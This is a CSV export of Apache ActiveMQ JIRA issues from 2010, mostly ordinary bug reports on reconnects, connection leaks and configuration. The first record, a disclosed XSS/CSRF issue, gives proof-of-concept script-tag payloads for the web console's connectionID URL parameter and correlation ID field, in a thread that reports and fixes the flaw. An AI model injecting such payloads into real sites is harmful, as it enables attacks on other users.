CVE-2010-0684",Linux environment.,rajats@gmail.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74872,,,Thu Apr 08 09:21:50 UTC 2010,,,,,,,,,,,"0|i0rpof:",159804,,,,,,,,,,,,,,,,,,,,,"17/Feb/10 19:38;rajats@gmail.com;Two issues:
- XSS
- XSRF/CSRF
;;;","23/Feb/10 15:41;dejanb;Fixed with svn revision 915384 and merged into 5.3 branch.

The web console should now be immune to XSS and CSRF attacks. First ones are fixed by sanitizing the output. The CSRF attacks are prevented by sending a secret to the form and checking it before modifying results. Also, POST method is forced where it is applicable.
;;;","07/Apr/10 10:45;joeluo;It looks like there are some new unpatched vunerabilities. Taking a release apache-activemq 5.3.1, installing it and navigating to :

http://localhost:8161/admin/connection.jsp?connectionID=%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E

you see an non-permanent XSS vunerability

For a permanent XSS vunerability do the following:

1) On web console go to the 'send' page:

set:

    * destination : ""foo""
    * correlation ID field to ""<script>alert('Vunerable to XSS!');</script>""

2) go to the queue browser page page for queue ""foo"" - you get an XSS attack;;;","07/Apr/10 12:14;romainw;Joe is correct.

Also, for the permanent XSS, ""correlation ID"" is not the only vulnerable variable. ""Reply To "", ""Type"", etc. are vulnerable.

It is important to sanitise user input in general, not just for the variables that are being reported here.;;;","07/Apr/10 14:00;dejanb;Fixed in svn revision 931552

Thanks for reporting this. I did some more sanitation and hopefully everything is covered now.;;;","08/Apr/10 08:18;jamesc;Dejan,

I just checked on the latest 5.4 snapshot (Thu Apr 08 04:00:00).  The first issue is fixed, but the second one (sending a message with correlationID containing script) still occurs.

cheers,

James.;;;","08/Apr/10 08:30;dejanb;Hi James,

I just tried to reproduce it, but it seems all fine from here. What are you seeing as a result?

Cheers,
Dejan;;;","08/Apr/10 09:03;jamesc;Dejan,

my mistake, activemq was picking up an old config file during my tests.  I confirm this now looks fixed.

I think you can close it now (again !)

thanks,

James.;;;","08/Apr/10 09:21;dejanb;No worries James, I'm glad it's really fixed. Cheers;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Polling consumer (prefetch size = 0) fails to reconnect,AMQ-2612,12483480,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,pagrus,pagrus,17/Feb/10 10:31,16/Dec/10 23:42,14/Jul/23 05:43,02/Sep/10 20:13,5.3.0,,,,,5.4.1,,,Broker,JMS client,,,3,,,,,,,,,"Scenario:
1. Configure polling consumer (prefetch=0), with onMessage()-style processing, e.g. with Spring's DefaultMessageListenerContainer.
2. Restart broker.
3. Notice consumer does not consumer messages anymore.

In client application this may show up during short network interruptions as reconnect message in logs/console + processing stoppage.

See http://old.nabble.com/ActiveMQ-reconnect-issue-with-consumer.prefetchSize%3D0-td27574923.html for more context.",Reproduced on Windows XP 32 bit and Fedora 12 64bit.,javier,koma,pagrus,thomas.demande,vadimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2877,,,,,,,,,,,,,,,,,,,,,,,,"17/Feb/10 10:40;pagrus;AMQ-2612-test.patch;https://issues.apache.org/jira/secure/attachment/12461621/AMQ-2612-test.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74873,,,Thu Dec 16 23:42:31 UTC 2010,,,,,,,,,,,"0|i0rpin:",159778,,,,,,,,,,,,,,,,,,,,,"17/Feb/10 10:40;pagrus;Attaching an activemq-core patch with test that reproduces the issue.;;;","02/Sep/10 20:13;tabish;This issue should be resolved by AMQ-2877;;;","02/Sep/10 20:13;tabish;Fix for AMQ-2877 should resolve this issue as well.;;;","16/Dec/10 23:42;mcheung610;still doesn't work if i specify my broker url to failover:(tcp://host:61616?jms.prefetchPolicy.queuePrefetch=1,tcp://s2hb-pmt-stg-svc4:61616?jms.prefetchPolicy.queuePrefetch=1)?randomize=false

When I start my consumer, it doesn't consume any messages. In the activemq web console, it show zero consumers. But it works if i put queuePrefetch=""1"" property in the activemq.xml.

 <destinationPolicy>
            <policyMap>
              <policyEntries>
                <policyEntry topic="">"" producerFlowControl=""true"" memoryLimit=""1mb"">
                  <dispatchPolicy>
                    <roundRobinDispatchPolicy />
                  </dispatchPolicy>
                  <pendingSubscriberPolicy>
                    <vmCursor />
                  </pendingSubscriberPolicy>
                  <subscriptionRecoveryPolicy>
                    <noSubscriptionRecoveryPolicy />
                  </subscriptionRecoveryPolicy>
                </policyEntry>
                <policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""1mb"" queuePrefetch=""1"">
                  <deadLetterStrategy>
                    <individualDeadLetterStrategy
                            queuePrefix=""DLQ."" useQueueForQueueMessages=""true"" />
                  </deadLetterStrategy>
                  <dispatchPolicy>
                    <roundRobinDispatchPolicy />
                  </dispatchPolicy>
                  <subscriptionRecoveryPolicy>
                    <noSubscriptionRecoveryPolicy />
                  </subscriptionRecoveryPolicy>
                </policyEntry>
              </policyEntries>
            </policyMap>
        </destinationPolicy>

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stopping camel context with ActiveMQComponent does not close connections to ActiveMQ,AMQ-2611,12483228,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,ariekenb,ariekenb,14/Feb/10 16:18,17/Feb/10 14:21,14/Jul/23 05:43,17/Feb/10 14:21,5.3.0,,,,,5.3.1,5.4.0,,,,,,0,,,,,,,,,"Stopping a camel context that uses an ActiveMQComponent does not appear to close connections to the ActiveMQBroker.  See the attached test case as an example.  It creates a camel context containing an ActiveMQ consumer and producer, sends a message, then destroys the context.  The test case does this in a loop so every 4 seconds the old camel context is destroyed and a new one is created.  Every second the test outputs the number of connections to the ActiveMQ broker.  This number continually grows over time.  After running for a few minutes I see output like this:


10:17:28,885 INFO  ActiveMQTest - num connections = 159
10:17:29,885 INFO  ActiveMQTest - num connections = 159
10:17:30,574 INFO  ActiveMQTest - creating context and sending message
10:17:30,574 INFO  DefaultCamelContext - Apache Camel 2.1.0-psc-01-00RC1 (CamelContext:camel-160) is starting
10:17:30,574 INFO  DefaultCamelContext - JMX enabled. Using DefaultManagedLifecycleStrategy.
10:17:30,744 INFO  DefaultCamelContext - Apache Camel 2.1.0-psc-01-00RC1 (CamelContext:camel-160) started
10:17:30,753 INFO  ActiveMQTest - consume message = message
10:17:30,885 INFO  ActiveMQTest - num connections = 160
10:17:31,885 INFO  ActiveMQTest - num connections = 160
10:17:32,747 INFO  ActiveMQTest - destroying context
10:17:32,747 INFO  DefaultCamelContext - Apache Camel 2.1.0-psc-01-00RC1 (CamelContext:camel-160) is stopping
10:17:32,755 INFO  DefaultInflightRepository - Shutting down with no inflight exchanges.
10:17:32,755 INFO  DefaultCamelContext - Apache Camel 2.1.0-psc-01-00RC1 (CamelContext:camel-160) stopped
10:17:32,886 INFO  ActiveMQTest - num connections = 160
10:17:33,885 INFO  ActiveMQTest - num connections = 160


Also if I do ""netstat -an | grep 61616"" I see the number of connections to the broker on TCP port 61616 is continually growing.","Ubuntu Linux 9.10, Sun JDK 1.6.0_15, Camel 2.1.0-psc-01-00RC1, ActiveMQ 5.3.0-psc-01-00RC1",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Feb/10 16:19;ariekenb;ActiveMQTest.java;https://issues.apache.org/jira/secure/attachment/12461610/ActiveMQTest.java","17/Feb/10 03:33;ariekenb;camel2469.patch;https://issues.apache.org/jira/secure/attachment/12461620/camel2469.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74874,,,Wed Feb 17 14:21:48 UTC 2010,,,,,,,,,,,"0|i0rqe7:",159920,,,,,,,,,,,,,,,,,,,,,"14/Feb/10 16:19;ariekenb;Example test case;;;","14/Feb/10 18:07;ariekenb;Looking into the code, it looks like by default org.apache.activemq.camel.component.ActiveMQConfiguration.usePooledConnection = true, so ActiveMQConfiguration.createConnectionFactory creates an org.apache.activemq.pool.PooledConnectionFactory.  PooledConnectionFactory needs to have stop() called on it to close underlying connections.  Nothing in camel is doing this when the context is closed.

One possible workaround is to manually create a PooledConnectionFactory and pass it to ActiveMQComponent.setConnectionFactory.  Then you have to call stop() yourself on the PooledConnectionFactory to close connections when the camel context is stopped.

This seems to be a bad default.  If by default camel is going to create a PooledConnectionFactory for the user, shouldn't it clean it up when the context is closed?;;;","15/Feb/10 09:37;davsclaus;Aaron good findings.

You could probably try to see if you can patch the AMQ component to be able to stop the connection factory when its stopped.
;;;","17/Feb/10 03:33;ariekenb;Here is a patch against activemq trunk.

This fixes my test case and passes all unit tests for activemq-camel.;;;","17/Feb/10 06:15;davsclaus;Aaron thanks for the patch. I have moved the ticket to AMQ as its a bug/issue with AMQ.;;;","17/Feb/10 14:21;dejanb;Fixed with svn revision 910984. I modified your test and converted it to test case. Thanks for the patch;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
expiry processing with file pending cursor and no consumers fills memory - causing producerFlowControll to kick in,AMQ-2610,12483225,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,16/Feb/10 13:05,19/Feb/10 09:37,14/Jul/23 05:43,19/Feb/10 09:37,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"The Memory usage limits are shared for a filependingmessagecursor and a queue. To have the cursor limit kick in first the usage portion needs to be reduced to below 70% as in: policy.setCursorMemoryHighWaterMark(50); for the destination.
This causes message references to be flushed to disk when the memory utilization reaches 50% ensuring that the memory usage limit for the queue of 70% is not met.

However, expiry processing with no consumers, needs to go directly to the cursor to examine messages (as none are paged in for dispatch) and this contract is problematic at the moment as there is no way to manage the message reference count via the cursor api for this use case. PageInList is promising but not complete.",all,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Feb/10 13:08;gtully;UnlimitedEnqueueTest.java;https://issues.apache.org/jira/secure/attachment/12461618/UnlimitedEnqueueTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74875,,,Fri Feb 19 09:37:35 UTC 2010,,,,,,,,,,,"0|i0rqm7:",159956,,,,,,,,,,,,,,,,,,,,,"16/Feb/10 13:08;gtully;Test case that shows spooling and block issue when workaround of using  {code}policy.setExpireMessagesPeriod(0);{code} is omitted.;;;","19/Feb/10 09:37;gtully;resolved in r911650 and 5.3 branch r911759

solution is to have pendingmessagecursor next  do an auto increment on what it returns to make the caller responsible for decrementing or holding on to the references. This allows a browser to peek at a reference and release it at will.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Locale dependent toUpperCase in IntrospectionSupport.,AMQ-2608,12483208,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,gtully,akos.baraz,akos.baraz,16/Feb/10 09:01,17/Feb/10 12:19,14/Jul/23 05:43,16/Feb/10 18:20,5.3.0,,,,,5.3.1,5.4.0,,,,,,0,,,,,,,,,"The org.apache.activemq.util.IntrospectionSupport.findSetterMethod uses name.substring(0, 1).toUpperCase(). What is local dependent. For example in turkish locale we won't get setter for 'initialReconnectDelay', because the uppercase of 'i' is not 'I'. 

I would suggest using Character.toUpperCase(name.charAt(0)) what is local independent.
",java,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74876,,,Wed Feb 17 12:19:38 UTC 2010,,,,,,,,,,,"0|i0rr53:",160041,,,,,,,,,,,,,,,,,,,,,"16/Feb/10 18:20;gtully;fix applied with thanks in r910637;;;","17/Feb/10 12:19;gtully;fix applied to 5.3 branch for 5.3.1 in r910945;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TransportConnector] Connector vm://null should contain broker name,AMQ-2607,12483192,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,15/Feb/10 19:42,18/Feb/10 14:27,14/Jul/23 05:43,15/Feb/10 19:45,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"the url I am using is

vm:(broker:(tcp://localhost:61616)/myBroker?persistent=false)

when to connector starts it says

2010-02-12 18:38:24,204 INFO [TransportConnector] Connector vm://null Started

instead of

2010-02-12 18:38:24,204 INFO [TransportConnector] Connector vm://myBroker Started

resolution: 
Hi,

class VMTransportFactory on method doCompositeConnect line 70

 if (brokerData.getPath() != null) {
               host = data.getPath();
           }

shouldn't it be

if (brokerData.getPath() != null) {
               host = brokerData.getPath();
           }

see: http://old.nabble.com/is-this-a-bug---tp27544304p27544304.html",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74877,,,Thu Feb 18 14:27:11 UTC 2010,,,,,,,,,,,"0|i0rqdz:",159919,,,,,,,,,,,,,,,,,,,,,"15/Feb/10 19:45;gtully;applied fix in r910315;;;","18/Feb/10 14:27;gtully;fix applied to 5.3 branch: r 911417;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LoggingBrokerPluggin doesn't log to the DLQ,AMQ-2604,12483184,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,rajdavies,rajdavies,rajdavies,15/Feb/10 05:52,21/Sep/11 10:00,14/Jul/23 05:43,15/Feb/10 05:56,5.3.0,,,,,5.4.0,,,,,,,0,,,,,,,,,"The LoggingBrokerPlugin fails to pass messages to a DLQ - this looks like an omission -  see 
http://old.nabble.com/LoggingBrokerPlugin-and-DLQ-td27588791.html",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,59940,,,Wed Sep 21 10:00:48 UTC 2011,,,,,,,,,,,"0|i0rqvr:",159999,,,,,,,,,,,,,,,,,,,,,"15/Feb/10 05:56;rajdavies;Fixed by SVN revision 910163;;;","21/Sep/11 10:00;sreepanchajanyam;is this revision included in 5.4.2?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Maven dependency:tree for ActiveMQ 5.3.0 seems to show conflicts about geronimo-j2ee-management jars,AMQ-2603,12482870,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,callain_conceptum,callain_conceptum,12/Feb/10 13:19,06/Jul/10 09:56,14/Jul/23 05:43,06/Jul/10 09:56,5.3.0,,,,,5.4.0,,,,,,,1,,,,,,,,,"My original post on http://old.nabble.com/Question-about-ActiveMQ-5.3.0-maven-dependencies-td27556755.html#a27561913 was:

When I run maven for a dependency:tree of activemq-core-5.3.0, I get this: 

[INFO] \- org.apache.activemq:activemq-core:jar:5.3.0:compile 
[INFO]    +- commons-logging:commons-logging-api:jar:1.1:compile 
[INFO]    +- org.apache.geronimo.specs:geronimo-jms_1.1_spec:jar:1.1.1:compile 
[INFO]    +- org.apache.activemq:activeio-core:jar:3.1.2:compile 
[INFO]    |  +- org.apache.geronimo.specs:geronimo-j2ee-management_1.1_spec:jar:1.0.1:compile 
[INFO]    |  \- commons-logging:commons-logging:jar:1.1:compile 
[INFO]    |     +- log4j:log4j:jar:1.2.12:compile 
[INFO]    |     +- logkit:logkit:jar:1.0.1:compile 
[INFO]    |     +- avalon-framework:avalon-framework:jar:4.1.3:compile 
[INFO]    |     \- javax.servlet:servlet-api:jar:2.3:compile 
[INFO]    +- org.apache.activemq:kahadb:jar:5.3.0:compile 
[INFO]    +- org.apache.activemq.protobuf:activemq-protobuf:jar:1.0:compile 
[INFO]    +- org.apache.geronimo.specs:geronimo-j2ee-management_1.0_spec:jar:1.0:compile 
[INFO]    +- org.springframework:spring-context:jar:2.5.6:compile 
[INFO]    |  +- aopalliance:aopalliance:jar:1.0:compile 
[INFO]    |  +- org.springframework:spring-beans:jar:2.5.6:compile 
[INFO]    |  \- org.springframework:spring-core:jar:2.5.6:compile 
[INFO]    \- commons-net:commons-net:jar:2.0:compile 

Now, I am wondering about the two jars: 

geronimo-j2ee-management_1.0_spec:jar:1.0 
geronimo-j2ee-management_1.1_spec:jar:1.0.1 

Don't they overlap/conflict? 

Answer on the forum from Gary Tully:

This is still the situation on trunk. Can you raise a jira issue to track 
this? 
We should exclude the activeio transitive dependency or update to the 1.0.1 
version for activemq. 

I have not seen any report of the jars clashing or causing problems, either 
they are compatible or the activeio management dependency is not called on 
at runtime if a journaled persistence adapter is used. 

So there we are. Thanks.
",,callain_conceptum,fjaouen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74878,,,Tue Jul 06 09:56:51 UTC 2010,,,,,,,,,,,"0|i0rq5r:",159882,,,,,,,,,,,,,,,,,,,,,"05/Jul/10 15:21;fjaouen;The problem is always there with version 5.3.2.

Does someone could give an answer about which version we could excluded ?

[INFO] |  +- org.apache.activemq:activemq-core:jar:5.3.2:compile
[INFO] |  |  +- org.apache.activemq:activeio-core:jar:3.1.2:compile
[INFO] |  |  |  \- org.apache.geronimo.specs:geronimo-j2ee-management_1.1_spec:jar:1.0.1:compile
[INFO] |  |  +- org.apache.activemq:kahadb:jar:5.3.2:compile
[INFO] |  |  +- org.apache.activemq.protobuf:activemq-protobuf:jar:1.0:compile
[INFO] |  |  +- org.osgi:org.osgi.core:jar:4.1.0:compile
[INFO] |  |  +- org.springframework.osgi:spring-osgi-core:jar:1.2.1:compile
[INFO] |  |  |  \- org.springframework.osgi:spring-osgi-io:jar:1.2.1:compile
[INFO] |  |  +- org.apache.geronimo.specs:geronimo-j2ee-management_1.0_spec:jar:1.0:compile
[INFO] |  |  \- commons-net:commons-net:jar:2.0:compile
[INFO] |  \- org.springframework:spring-core:jar:2.5.6:compile
;;;","06/Jul/10 09:56;gtully;upgraded to org.apache.geronimo.specs:geronimo-j2ee-management_1.1_spec:1.0.1 in r960857;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Distribution activemq.xml does not match distribution activemq.xsd, causing SAXParseException with newer versions of Spring",AMQ-2599,12483193,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,khunter,khunter,08/Feb/10 20:45,26/Feb/10 14:16,14/Jul/23 05:43,15/Feb/10 15:48,5.3.0,,,,,5.3.1,5.4.0,,,,,,0,,,,,,,,,"In the 5.3.0 distribution, an ""activemq.xml"" file is provided in the ""conf"" directory.  The format of this file does not match the schema ""activemq.xsd"" that is located in the activemq-core-5.3.0.jar.  Specifically, in the latter, the ""broker"" tag is defined as a sequence of tags as follows:
	adminView
	applicationContext
	consumerSystemUsage
	destinationFactory
	destinationInterceptors
	destinationPolicy
	destinations
	jmsBridgeConnectors
	managementContext
	messageAuthorizationPolicy
	networkConnectorURIs
	networkConnectors
	persistenceAdapter
	persistenceFactory
	persistenceTaskRunnerFactory
	plugins
	producerSystemUsage
	proxyConnectors
	regionBroker
	services
	sslContext
	systemUsage
	taskRunnerFactory
	tempDataStore
	transportConnectorURIs
	transportConnectors

(suspiciously, these tags are listed in alphabetical order - I question whether ""sequence"" was the correct type in the xsd, as opposed to ""one or more of the following"")

In any event, in the ""activemq.xml"" that is provided as part of the distribution, the children of the ""broker"" tag are provided in the following order:
	managementContext
	persistenceAdapter
	destinationPolicy
	systemUsage
	transportConnectors

If the activemq.xsd file is correct, then ""destinationPolicy"" should have been positioned first - before ""managementContext"".  Alternately, the tag order in the xsd file needs to be reworked.

This problem causes a SAXParseException if one tries to use the default activemq.xml with Spring 3.0 jars used instead of the Spring 2.5.6 jars that come with the distribution.  I can only presume that the newer version of Spring is configured, by default, to validate parsed XML against the XSD, while Spring 2.5.6 is not.

I note that http://activemq.apache.org/networks-of-brokers.html indicates ""Order of construction of networks/persistence/transports IS important!""  This at least suggests to me that the ordering of other tags might possibly be important, or that multiple orders may be valid depending on the desired effect.  Thus, it is not immediately obvious which of the two files is, in fact, the correct one.

Regardless, it seems that the example XML file should match the provided XSD file.

The current workaround is to either use a version of Spring earlier than 3, or to edit the activemq.xml to re-order the children of ""broker"".",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74879,,,Mon Feb 15 15:48:35 UTC 2010,,,,,,,,,,,"0|i0rr1j:",160025,,,,,,,,,,,,,,,,,,,,,"15/Feb/10 15:48;gtully;resolved in r910238

The example configuration files now match the schema as they should do. 

Order is an attribute of the sequence but the sequence is important as it allows for extensibility, see: http://www.w3.org/2005/07/xml-schema-patterns.html#Collection-Extending-Elements ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Configuring HTTP <networkConnector> with proxyHost, proxyPort results in ""Invalid connect parameters: {proxyPort=nn)}"" error",AMQ-2598,12481925,12481628,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,gsaffell,gsaffell,08/Feb/10 20:09,20/Aug/10 14:11,14/Jul/23 05:43,12/Aug/10 15:19,5.3.0,,,,,5.4.1,,,Transport,,,,0,,,,,,,,,"I'm trying to set up a forwarding bridge that will connect through an http proxy (where the proxy happens to be running on the same machine as the destination ApacheMQ instance). Per AMQ-1099, the following should work: 

<networkConnector name=""gstest-252"" uri=""static://(http://gstest-252:61617?proxyHost=gstest-252&amp;proxyPort=80)"" networkTTL=""5""/>  

But it results in the following error at start up:

 INFO | Establishing network connection from vm://localhost to http://gstest-252
:61617?proxyHost=gstest-252&proxyPort=80&proxyHost=gstest-252&proxyPort=80)

 WARN | Could not connect to remote URI: http://gstest-252:61617?proxyHost=gstes
t-252&proxyPort=80&proxyHost=gstest-252&proxyPort=80): Invalid connect parameter
s: {proxyPort=80)}

 INFO | Network Connector gstest-252 Started",Windows XP,gsaffell,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14668,,,Mon Aug 16 14:55:04 UTC 2010,,,,,,,,,,,"0|i0b9rb:",63693,Regression,,,,,,,,,,,,,,,,,,,,"10/Feb/10 22:43;gsaffell;I did some debugging and the problem seems to be caused by org.apache.activemq.network.DiscoveryNetworkConnector.onServiceAdd() method where it calls ""connectUri = URISupport.applyParameters(connectUri, parameters);"" 

Note in the output included in the description of this issue, the ""INFO | Establishing network connection"" reports the query parameters twice and inccludes "")"" at the end.  That duplication and the addition of the "")"" to the end of the last parameter is caused by the applyParameters() call. I found that if I comment that call out, every thing works fine. (Commenting out that code is probably not the correct solution.  Maybe the problem is with what ever code populated the ""parameters"" HashMap that is being passed to the applyParameters() method? At any rate, I just wanted to note what I've found so far.);;;","12/Aug/10 15:19;dejanb;Fixed with svn revision 984826

Just a note that it won't work with the url you're using

static://(http://gstest-252:61617?proxyHost=gstest-252&amp;proxyPort=80)

You need to use

static:(http://gstest-252:61617?proxyHost=gstest-252&amp;proxyPort=80)

which is a properly formatted composite url.;;;","16/Aug/10 14:55;gsaffell;Thanks, we will update our activemq.xml files accordingly.  I actually got that from the examples on http://activemq.apache.org/networks-of-brokers.html.  You'll note that the first couple of examples show it the way you suggest but the examples further down have ""static://.   ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Transaction commit/rollback through failover should throw TransactionRolledBackException if recovery redelivery dispatches to another consumer,AMQ-2590,12483211,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,01/Feb/10 22:39,19/Apr/13 22:29,14/Jul/23 05:43,01/Feb/10 22:43,5.3.0,,,,,5.3.1,5.4.0,,JMS client,,,,0,,,,,,,,,"Given an outstanding consumer transaction and failover transport recovery. On recovery, messages are redispatched by the broker once the connection, sessions and producers/consumers and transactions are replayed. Redispatch may not dispatch the same messages to the same consumers atm. In the case that a client transaction cannot be recreated it should fail with a TransactionRolledBackException. The failure indicates that the messages the session wants to ack have not again been redispatched so their receipt cannot be committed. The messages in question will have been redelivered to another consumer. 
Likewise in a rollback, in this case there is a warn message to the effect that the rolled back messages may not all be included in the rollback. It that they may not have been redispatched. The unordered redelivery semantics after a session rollback ensure that this error does not need to propagate up to the client.
